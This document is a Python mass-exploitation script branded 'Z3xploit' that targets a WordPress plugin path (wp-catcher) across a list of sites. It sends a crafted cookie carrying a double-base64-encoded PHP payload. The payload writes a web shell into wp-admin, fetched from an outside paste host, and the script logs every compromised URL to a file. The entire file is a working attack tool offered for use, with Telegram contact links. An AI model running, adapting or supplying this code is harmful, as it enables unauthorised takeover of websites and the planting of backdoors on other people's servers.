# -*-coding:Latin-1 -*
import sys , requests, re, string, random, base64
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init
init(autoreset=True)

fr  =   Fore.RED
fc  =   Fore.CYAN
fw  =   Fore.WHITE
fg  =   Fore.GREEN
fm  =   Fore.MAGENTA

banner= f"""{Fore.RED}
[#] Created by:


  __________             _       _ _   
 |___  /___ \           | |     (_) |  
    / /  __) |_  ___ __ | | ___  _| |_ 
   / /  |__ <\ \/ / '_ \| |/ _ \| | __|
  / /__ ___) |>  <| |_) | | (_) | | |_ 
 /_____|____//_/\_\ .__/|_|\___/|_|\__|
                  | |                  
                  |_|              
                  
                                     Telegram:   https://t.me/z3xrin
                                     Telegram Channel: https://t.me/z3xploit												 
															 

"""
print(banner)
requests.urllib3.disable_warnings()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')
                        

def generate_random_string(length):
    characters = string.ascii_letters + string.digits
    random_string = ''.join(random.choice(characters) for _ in range(length))
    return random_string



def URLdomain(site):
    if site.startswith("http://") :
        site = site.replace("http://","")
    elif site.startswith("https://") :
        site = site.replace("https://","")
    else :
        pass
    pattern = re.compile('(.*)/')
    while re.findall(pattern,site):
        sitez = re.findall(pattern,site)
        site = sitez[0]
    return site


def checker(url):
    try:
    
    
        Filename = generate_random_string(8) + ".php"
        
        Encodedd = "<?php echo 'X4Exploit'; fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/wp-admin/{}','w+'),file_get_contents('{}')); ?>".format(Filename, "https://rentry.co/aqtvz/raw")
        Encodedd2 = base64.b64encode(Encodedd)
        payloads  = base64.b64encode(Encodedd2)
        headers = {'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com',
            'Cookie': '14[5]=file_exists;14[7]=a1;14[12]=a123;14[14]=a2;14[19]=a3;14[21]=b123;14[26]=a4;14[28]=a5;14[33]=c123;14[35]=a6;14[40]=file_exists;14[42]=d123;14[47]=fopen;14[49]=a9;14[54]=base64_decode;14[56]=a;14[61]=a10;14[63]=e123;14[68]=abc;14[70]=kk;14[75]=base64_decode;14[77]=ddd;14[82]=a11;14[84]=g123;14[89]=a12;14[91]=a13;14[96]=.php;14[98]=a14;14[103]=a15;14[105]=i123;14[110]=w;14[112]=a17;14[117]=j123;14[119]=a18;14[124]=a;14[126]=k123;14[131]=a19;14[133]=a20;14[138]=l123;14[140]=a21;14[145]=a22;14[147]=m123;14[152]=uniqid;14[154]=a24;14[159]=n123;14[161]=a25;14[166]=a26;14[168]=o123;14[173]=a;14[175]=a27;14[180]=fwrite;14[182]=a28;14[187]=a29;14[189]=r123;14[194]=a30;14[196]=a31;14[201]=s123;14[203]=a32;14[208]=;14[210]=t123;14[215]=a35;14[217]=a;14[222]=q123;14[224]=a35;14[229]=a36;14[231]=u123;14[236]=a37;14[238]=a38;14[243]=w123;14[245]=a39;14[250]=a40;14[252]=x123;14[257]=a41;14[259]=a42;14[264]=123;14[266]=a;14[271]=a43;14[273]=y123;14[278]=a44;14[280]=a44;14[285]=z123;14[287]=a45;14[292]=a46;14[294]=1234;3='+payloads}
        url = 'http://' + URLdomain(url)
        check = requests.get(url+'/wp-content/plugins/wp-catcher/index.php',headers=headers , timeout=15 , allow_redirects=False)
        if 'X4Exploit' in check.text:
                print (' -| ' + url + ' --> {}[Succefully]'.format(fg))
                open('wp-catcherShell.txt', 'a').write(url+ "/wp-admin/" + Filename +'\n')
        else:
            url = 'https://' + URLdomain(url)
            check1 = requests.get(url+'/wp-content/plugins/wp-catcher/index.php',headers=headers,timeout=15 , verify=False)
            if 'X4Exploit' in check1.text:
                print (' -| ' + url + ' --> {}[Succefully]'.format(fg))
                open('wp-catcherShell.txt', 'a').write(url+ "/wp-admin/" + Filename +'\n')
            else:
                print (' -| ' + url + ' --> {}[Failed]'.format(fr))
    except :
        print (' -| ' + url + ' --> {}[Failed]'.format(fr))
mp = Pool(90)
mp.map(checker, target)
mp.close()
mp.join()
